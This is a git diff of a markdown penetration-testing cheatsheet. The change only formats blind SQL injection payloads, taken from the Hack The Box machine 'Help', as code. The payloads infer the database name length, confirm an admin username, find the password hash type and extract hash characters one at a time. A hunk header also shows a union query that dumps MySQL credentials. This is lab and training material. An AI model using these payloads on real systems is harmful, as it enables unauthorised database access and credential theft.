@@ -352,8 +352,9 @@ php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mys
 
 ### Blind SQL Injection:
 Read more: https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi#mysql-boolean-based-blind-sql-injection-cheatsheet
+
 Example from the machine Help from HTB:
-&param[]=6 and (length(database())) = 7-- -
+```&param[]=6 and (length(database())) = 7-- -```
 returns the site properly:
 database name length has 7 characters
 
@@ -362,7 +363,7 @@ table name we're looking for is likely to be 'staff'
 
 check if username of 'staff' table is 'admin'
 
-&param[]=6 and ((select username from staff limit 0,1 )) = 'admin'-- -
+```&param[]=6 and ((select username from staff limit 0,1 )) = 'admin'-- -```
 returns the site properly -> username is admin
 
 Try and check for length of password (hashed)
@@ -370,18 +371,18 @@ md5: 32 characters
 sha1: 40 characters
 sha256: 64 characters
 
-&param[]=6 and (length((select password from staff limit 0,1 ))) = 32-- -
+```&param[]=6 and (length((select password from staff limit 0,1 ))) = 32-- -```
 does not return site properly -> not 32
 
-&param[]=6 and (length((select password from staff limit 0,1 ))) = 40-- -
+```&param[]=6 and (length((select password from staff limit 0,1 ))) = 40-- -```
 returns site properly -> password hash is sha1
 
 check if first character of the password hash is 'a'
-&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -
+```&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -```
 iterate a->f 0->9 until request returns site properly
 
 check for second character:
-&param[]=6 and (substr((select password from staff limit 0,1 ),2,1)) = 'a'-- -
+```&param[]=6 and (substr((select password from staff limit 0,1 ),2,1)) = 'a'-- -```
 ```
 import requests
 
